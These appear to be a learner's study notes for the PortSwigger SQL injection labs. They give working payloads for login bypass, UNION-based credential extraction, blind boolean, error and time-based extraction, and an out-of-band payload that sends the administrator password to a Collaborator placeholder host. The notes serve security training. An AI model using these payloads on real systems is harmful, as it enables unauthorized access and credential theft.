# PortSwigger SQL Injection Labs — Notes & Walkthrough Logic

> Personal reference notes for the PortSwigger Web Security Academy SQL Injection track.
> Format: **What it is → What to change in Burp → What "it worked" looks like → What "something's wrong" looks like.**

---

## 1. SQL Injection: Retrieving Hidden Data

**Scenario:** A product filter (e.g. `?category=Gifts`) builds a query like:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**What to do:**
- Send the request to Burp Repeater.
- In the `category` parameter, change the value to break out of the string and neutralize the rest of the WHERE clause:
  ```
  category=Gifts'--
  ```
  or to pull *everything* regardless of category:
  ```
  category=Gifts'+OR+1=1--
  ```
- `--` (with a trailing space, or `-- -` in URL form) comments out the rest of the original query so `AND released = 1` never executes.

**Result if it worked:**
- The response now shows **unreleased products** or **all categories' products** instead of just the filtered set — more rows/items appear in the HTML than a normal category page would ever show.

**Result if something's wrong:**
- A 500 error or a generic "Internal Server Error" page → your quote broke the syntax but your comment didn't land correctly (e.g. missing space after `--`, or the backend uses a different comment style).
- No change in the response at all → the parameter might not be the injectable one, or it's not reaching the DB as a raw string (could be pre-validated/escaped).

---

## 2. SQL Injection: Login Bypass

**Scenario:** Login query looks like:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'x'
```

**What to do:**
- In the `username` field, submit:
  ```
  administrator'--
  ```
- Leave the password field as anything (it gets commented out).

**Result if it worked:**
- You're redirected to `/my-account` and the page shows you're logged in as `administrator`.

**Result if something's wrong:**
- "Invalid username or password" still shows → either the username doesn't exist as typed, or the app parameterizes this specific field (not exploitable here), or there's extra whitespace/encoding issue in what you sent (check Burp's raw request, not just the browser).
- Check the response length in Burp — a bypassed login response is usually noticeably longer/shorter than the failed-login response, which is a quick tell even before reading content.

---

## 3. UNION Attack: Determining the Number of Columns

**Scenario:** You suspect UNION-based extraction is possible but need the column count first.

**What to do (two methods):**
- **ORDER BY method:** Increment a number until it errors:
  ```
  ?category=Gifts' ORDER BY 1--
  ?category=Gifts' ORDER BY 2--
  ?category=Gifts' ORDER BY 3--   ← keep going
  ```
  The number where it errors means the previous number was the actual column count.
- **UNION SELECT NULL method:** Add NULLs one at a time:
  ```
  ?category=Gifts' UNION SELECT NULL--
  ?category=Gifts' UNION SELECT NULL,NULL--
  ```
  Keep adding NULLs until no error.

**Result if it worked (found the right count):**
- Page loads normally (HTTP 200), same layout as before, no DB error text.

**Result if something's wrong:**
- An error like "The used SELECT statements have a different number of columns" → you haven't hit the right count yet, keep adjusting.
- A generic app-level error unrelated to columns → your injection point/quote handling is off, re-check syntax before continuing the column hunt.

---

## 4. UNION Attack: Finding a Column That Contains Text

**Scenario:** You know the column count (say 3), now need to know which column(s) can hold string data so you can inject readable output.

**What to do:**
- Replace NULLs one at a time with a string:
  ```
  ' UNION SELECT 'a',NULL,NULL--
  ' UNION SELECT NULL,'a',NULL--
  ' UNION SELECT NULL,NULL,'a'--
  ```

**Result if it worked:**
- The literal string `'a'` (or whatever you used) shows up rendered somewhere in the page — that tells you exactly which column position is reflected in the visible output.

**Result if something's wrong:**
- Error like "conversion failed when converting the varchar value... to data type int" → that column is numeric-only, move to the next position.
- String doesn't appear anywhere even though no error → the column might be selected but not rendered in the HTML (e.g. used for an image URL or hidden attribute) — view page source, not just the rendered page.

---

## 5. UNION Attack: Retrieving Data from Other Tables

**Scenario:** Once you have the injectable column, pull data from `users` table instead of `products`.

**What to do:**
```
' UNION SELECT username, password FROM users--
```
(adjust NULL/column count/positions to match what you found earlier, e.g.:
```
' UNION SELECT username, password, NULL FROM users--
```

**Result if it worked:**
- Usernames and password hashes/values appear directly in the page body where product names would normally show.

**Result if something's wrong:**
- "Invalid object name 'users'" → wrong table name; you may need to enumerate table names first (see Section 9).
- Data appears but garbled/truncated → you may have picked a column that's length-limited on the frontend; try a different column position.

---

## 6. UNION Attack: Retrieving Multiple Values in a Single Column

**Scenario:** Only one column is rendered as text, but you need both username and password.

**What to do:**
- Concatenate the two values into one string with a separator, using the DB's concat syntax:
  ```
  ' UNION SELECT username || '~' || password, NULL FROM users--
  ```
  (Oracle/PostgreSQL use `||`; MySQL uses `CONCAT(username,'~',password)`; SQL Server uses `+`.)

**Result if it worked:**
- You see something like `administrator~8a55dc...` in a single rendered field — the `~` (or whatever separator) lets you split username from password visually.

**Result if something's wrong:**
- Syntax error → wrong concatenation operator for that DB engine. This is also a **fingerprinting signal**: which concat syntax doesn't error tells you the underlying DBMS (useful going forward).

---

## 7. Blind SQLi: Conditional Responses

**Scenario:** No error messages, no reflected output — but the app behaves *differently* depending on true/false conditions (e.g., a "Welcome back" banner shows or doesn't, based on a cookie value used in a query).

**What to do:**
- Send a request with a boolean-true condition in the injectable parameter (often a `TrackingId` cookie):
  ```
  TrackingId=xyz' AND '1'='1
  ```
  vs a boolean-false:
  ```
  TrackingId=xyz' AND '1'='2
  ```
- Use **Burp Intruder** with the payload position on the condition, cycling through guesses (e.g., testing each character of a password):
  ```
  TrackingId=xyz' AND SUBSTRING(password,1,1)='a
  ```

**Result if it worked:**
- The TRUE condition produces one visible page state (e.g. "Welcome back") and FALSE produces another (no banner) — that binary difference is your oracle. In Intruder, this shows as a **response length or status difference** between payloads — sort the results by length/status to instantly see which guesses were "true."

**Result if something's wrong:**
- Every response looks identical regardless of condition → either the injection point is wrong, or the query isn't actually being affected by your input (test with an obviously true `1=1` vs obviously false `1=2` first, before testing real data).
- Note: you mentioned losing visibility from Intruder's "Show only items with notes" filter — worth flagging as a checklist item: **always confirm that filter is off before assuming "no results" means "no hits."**

---

## 8. Blind SQLi: Conditional Errors

**Scenario:** No visible difference in page content, but the app throws a 500 error under certain injected conditions (e.g., a division-by-zero trick forces an error only when a condition is true).

**What to do:**
```
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Swap `1=1` for the actual condition you're testing (e.g., checking a password character).

**Result if it worked:**
- When the condition is TRUE, you get a 500 Internal Server Error (division by zero triggered). When FALSE, you get a normal 200 response.

**Result if something's wrong:**
- Errors every time regardless of condition → your CASE/WHEN syntax itself is malformed, not the condition.
- Never errors → the DBMS might not support this exact division-by-zero trick (engine-specific); try a different error-forcing function.

---

## 9. Blind SQLi: Time Delays

**Scenario:** No content difference, no error difference — the only oracle is *how long the response takes*.

**What to do:**
```
'; IF (1=1) WAITFOR DELAY '0:0:5'--    (SQL Server)
' AND SLEEP(5)--                        (MySQL)
' || pg_sleep(5)--                      (PostgreSQL)
```
Watch the **response time** in Burp Repeater (shown bottom-right).

**Result if it worked:**
- Response takes ~5 seconds longer when condition is TRUE, returns instantly when FALSE.

**Result if something's wrong:**
- No delay ever → wrong DB-specific syntax, or query isn't reaching the DB at all (test with an unconditional delay first, e.g. just `SLEEP(5)` alone, to confirm injection works before adding conditions).
- Delay happens *every time* regardless of your condition → your condition logic is broken (e.g., AND vs OR precedence), so double check parentheses.

---

## 10. Blind SQLi: Time Delays + Information Retrieval

**Scenario:** Same as above, but now extracting actual data character-by-character (e.g., an admin password) using conditional time delays.

**What to do:**
- Use Burp Intruder with a **cluster bomb or sniper attack** testing each character position against each possible character:
  ```
  ' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)-- (MySQL)
  ```
- Iterate position (1,2,3...) and character (a-z,0-9) until each position resolves.

**Result if it worked:**
- For the correct character at a given position, response time spikes (~5s+); for all incorrect characters, response is fast. Sort Intruder results by **response time column** to spot the outlier.

**Result if something's wrong:**
- All responses uniformly slow → possible false positive from server load; increase delay to make the signal clearer (e.g., 10s) and re-test.
- All responses uniformly fast, no hits ever → check that your SUBSTRING indices are 1-based (not 0-based) and that the string comparison is case-sensitive/insensitive as expected by the DB.

---

## 11. Blind SQLi with Out-of-Band (OOB) Interaction

**Scenario:** No usable response difference at all (no content, error, or timing signal) — need to exfiltrate via DNS/HTTP callback using **Burp Collaborator**.

**What to do:**
- Generate a unique Collaborator payload (Burp → Collaborator tab → "Copy to clipboard").
- Inject a DB command that forces an out-of-band network call to that domain:
  ```
  '; EXEC master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--   (SQL Server)
  ```
  For data exfiltration (not just confirmation), embed the queried value into the subdomain:
  ```
  '||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
  ```

**Result if it worked:**
- Burp Collaborator's "poll now" shows a DNS or HTTP interaction logged from the target server — confirming blind execution even with zero visible response difference. If you exfiltrated data in the subdomain, it appears in the logged DNS lookup itself.

**Result if something's wrong:**
- No interaction logged at all → either the injection didn't execute, the target has no outbound network access/egress filtering, or the specific OOB technique isn't supported by that DB engine — try a different OOB method for the same DBMS.
- Interaction logged but with malformed/truncated subdomain data → DNS label length limits (63 chars per label) — you may need to chunk the extracted data across multiple requests.

---

## 12. Visible Error-Based SQLi

**Scenario:** The app returns raw DB error messages, which can be abused to leak data through the error text itself (no need for UNION/blind at all).

**What to do:**
- Force a type-conversion error that embeds a subquery's result inside the error message:
  ```
  ' AND 1=CONVERT(int,(SELECT @@version))--        (SQL Server)
  ' AND extractvalue(1,concat(0x7e,(SELECT version())))--  (MySQL)
  ```

**Result if it worked:**
- The error page itself contains readable data (DB version string, table names, or query results) embedded directly in the error text — no need to blind-guess character by character.

**Result if something's wrong:**
- Generic error with no embedded data → error verbosity might be disabled in this app config, or the conversion function used doesn't match the DB engine — confirm DBMS type first (see fingerprinting note in Section 6).

---

## Quick Fingerprinting Cheatsheet (useful before choosing syntax above)

| Check | MySQL | SQL Server | PostgreSQL | Oracle |
|---|---|---|---|---|
| Comment | `--space` or `#` | `--` | `--` | `--` |
| Concatenation | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` |
| Sleep/delay | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `pg_sleep(5)` | `dbms_lock.sleep(5)` |
| Version query | `SELECT @@version` | `SELECT @@version` | `SELECT version()` | `SELECT * FROM v$version` |
| Current DB | `SELECT database()` | `SELECT DB_NAME()` | `SELECT current_database()` | `SELECT ora_database_name FROM dual` |

**General debugging checklist when a lab isn't behaving:**
1. Confirm the injection point first with the simplest possible test (`'` alone → should break something visibly).
2. Confirm DBMS type using the fingerprinting table above before assuming your payload syntax is "correct but not working."
3. In Intruder, double-check filters (like "Show only items with notes") aren't hiding real hits.
4. Compare response **length** and **time**, not just visible text — many signals are non-obvious.
5. Always test an unconditional version of a payload (always-true, or unconditional delay) before layering in the actual condition you're trying to extract.

---

*Part of the 90-day cybersecurity roadmap — Phase 1 (Web/PortSwigger track). Pair with the XSS labs notes for the full Web Security Academy foundation set.*
